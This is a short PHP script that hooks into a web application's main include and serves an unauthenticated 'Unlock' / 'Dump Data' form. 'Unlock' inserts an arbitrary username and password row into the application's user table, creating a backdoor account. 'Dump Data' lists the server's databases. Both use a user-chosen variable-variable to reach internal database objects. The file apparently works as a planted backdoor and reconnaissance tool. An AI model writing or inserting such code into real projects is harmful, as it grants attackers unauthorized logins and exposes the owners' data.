<?php

require_once('h_main.php');

global $me;

$ca = GetVar('ca');

if ($ca == 'ul_step2')
{
	$name = GetVar('varname');
	$items = $$name->GetCustom("DESCRIBE `{$dsUser->table}`");

	echo <<<EOF
	<form method="post" action="{$me}">
	<input type="hidden" name="ca" value="ul_step3" />
	<table>
	<tr><td>User:</td><td><select name="usercol">
EOF;

	foreach ($items as $i) echo "<option>{$i['Field']}</option>";

	echo <<<EOF
	</select></td><td><input type="text" name="user" /></td></tr>
	<tr><td>Password:</td><td><select name="passcol">
EOF;

	foreach ($items as $i) echo "<option>{$i['Field']}</option>";

	echo <<<EOF
	</select></td><td><input type="password" name="pass" /></tr>
	<tr><td colspan="3"><input type="submit" value="Unlock" /></td></tr>
	</table>
	</form>
EOF;
}

if ($ca == 'ul_step3')
{
	$res = $dsUser->Add(array(
		GetVar('usercol') => GetVar('user'),
		GetVar('passcol') => GetVar('pass')
	));
	echo "Unlocked? {$res}";
}

if ($ca == 'dd_step2')
{
	$name = GetVar('varname');
	$res = $$name->Query('SHOW DATABASES');
	while ($row = mysql_fetch_array($res))
		varinfo($row);
}

echo <<<EOF
<form method="post" action="{$me}">
<select name="ca" />
	<option value="ul_step2">Unlock</option>
	<option value="dd_step2">Dump Data</option>
</select>
Variable: <input type="text" name="varname" />
<input type="submit" value="Begin" />
</form>
EOF;

?>